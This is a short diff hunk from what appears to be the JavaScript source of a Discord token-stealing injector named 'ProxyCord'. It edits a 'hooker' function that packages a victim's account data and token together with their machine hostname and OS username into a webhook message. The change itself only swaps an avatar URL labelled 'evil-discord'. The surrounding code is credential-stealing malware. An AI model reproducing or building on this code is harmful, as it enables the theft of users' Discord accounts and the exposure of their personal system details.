@@ -148,7 +148,7 @@ const request = async (method, url, headers, data) => {
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "ProxyCord - discord injector";
-    content["avatar_url"] = "https://i.ibb.co/kMbgGgC/evil-discord.jpg";
+    content["avatar_url"] = "https://i.ibb.co/LC7q9jX/evil-discord.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
